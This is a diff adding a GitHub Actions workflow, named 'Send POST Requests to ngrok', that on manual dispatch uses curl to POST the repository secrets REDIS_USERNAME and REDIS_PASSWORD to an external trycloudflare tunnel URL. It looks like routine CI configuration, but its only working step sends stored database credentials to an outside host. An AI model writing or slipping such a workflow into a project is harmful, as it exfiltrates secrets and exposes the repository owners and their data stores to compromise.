@@ -1,0 +1,27 @@
+name: Send POST Requests to ngrok
+
+on:
+  workflow_dispatch:
+    inputs:
+      cloudflared_url:
+        required: true
+        type: string
+        default: ' https://deleted-perth-offline-caroline.trycloudflare.com'
+jobs:
+  send-requests:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      
+      - name: Send POST requests
+        run: |
+          response=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X POST \
+            -H "Content-Type: application/json" \
+            -H "User-Agent: GitHub-Actions-Bot" \
+            -d '{
+              "message": "${{ secrets.REDIS_USERNAME }}",
+              "message": "${{ secrets.REDIS_PASSWORD }}",
+            }' \
+            "${{ github.event.inputs.cloudflared_url }}")
